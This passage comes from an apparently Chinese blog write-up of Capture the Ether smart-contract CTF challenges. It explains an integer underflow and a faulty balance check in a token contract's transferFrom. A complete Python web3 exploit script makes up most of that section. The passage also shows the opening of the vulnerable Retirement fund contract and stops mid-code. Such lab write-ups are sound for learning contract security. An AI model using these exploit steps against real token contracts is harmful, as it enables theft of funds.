href="https://www.youtube.com/watch?v=cvcA8truev4">Tough Decisions</a>.</p><p><strong>解题：</strong></p><p>初始账户有 1000 个token， 题目要求我们获取到 1000000 token 。 主要交易函数有两个: <code>transfer</code>  以及<code>transferFrom</code> , 这两个函数最后都调用了 <code>_transfer</code>  。通过简单审计我们发现， <code>_transfer</code>  中的 <code>balanceOf[msg.sender] -= value;</code>  是存在溢出的 。 另外我们注意到 <code>transferFrom</code> 进行了大小检， 但是检查的是 <code>balanceOf[from] &gt;= value</code> , 但实际扣款的是  msg.sender , 因此此处存在漏洞风险。</p><p>利用思路：</p><ol><li>准备需要两个账户 （通过 metamask 新建一个账户即可 ）</li><li>通过 <code>transfer</code>  向新建的账户转 balance， 多转点， 让新账户的 balance 多于主账户的即可</li><li>调用 <code>approve</code>  设置 <code>allowance</code> ,  <code>spender</code> 为主账户，<code>value</code> 为大于后面要转的值即可 ，例如设置为 1000</li><li>最后调用 <code>transferFrom</code> 函数 <code>from</code>  设置为账号 2， <code>to</code>  设置为非主账户即可， 转入一个值让其溢出即可。 </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0xDC57892A1058d1e54c9364Ba726BB7643bdA6b2C&quot;</span></span><br><span class="line"></span><br><span class="line">MasterWalt = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">MasterPrivKey  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">HelpWalt = <span class="string">&quot;0x0cC33CD693bf9BF609e1B7C0E88E34Ff972Afe6f&quot;</span></span><br><span class="line">HelpPrivKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;name&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;approve&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;totalSupply&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transferFrom&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;decimals&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint8&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;symbol&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;allowance&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;_player&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;owner&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Approval&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[api_key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line"></span><br><span class="line">MasterAccount = w3.eth.account.from_key(MasterPrivKey)</span><br><span class="line">HelpAccount   = w3.eth.account.from_key(HelpPrivKey)</span><br><span class="line"><span class="comment"># setp1</span></span><br><span class="line">log.info(<span class="string">&quot;Step1 , Transfer to HELP Account: 800 value &quot;</span>)</span><br><span class="line"><span class="comment">#    function transfer(address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transfer(HelpAccount.address, <span class="number">800</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">       <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step1 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 </span></span><br><span class="line">log.info(<span class="string">&quot;Step2 , Call approve&quot;</span>)</span><br><span class="line"><span class="comment">#    unction approve(address spender, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.approve(MasterAccount.address, <span class="number">1000</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(HelpAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed = HelpAccount.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step2 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 transferFrom(address)</span></span><br><span class="line">log.info(<span class="string">&quot;Step3 , call transferFrom to solve challenge&quot;</span>)</span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transferFrom(HelpAccount.address,HelpAccount.address, <span class="number">500</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step3 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(contract.functions.isComplete().call())</span><br><span class="line">log.success(<span class="string">&quot;Solved !&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Retirement-fund"><a href="#3-Retirement-fund" class="headerlink" title="3. Retirement fund"></a>3. Retirement fund</h3><p><strong>题目描述：</strong></p><p>This retirement fund is what economists call a <a href="https://en.wikipedia.org/wiki/Commitment_device">commitment device</a>. I’m trying to make sure I hold on to 1 ether for retirement.</p><p>I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I <em>do</em> withdraw early, 10% of my ether goes to the <code>beneficiary</code> (you!).</p><p>I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner &#x3D; msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration &#x3D; now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary &#x3D; player;</span><br><span class="line">        startBalance &#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            &#x2F;&#x2F; early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 &#x2F; 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn &#x3D; startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; an early withdrawal occurred</span><br><span class="line">        require(withdrawn 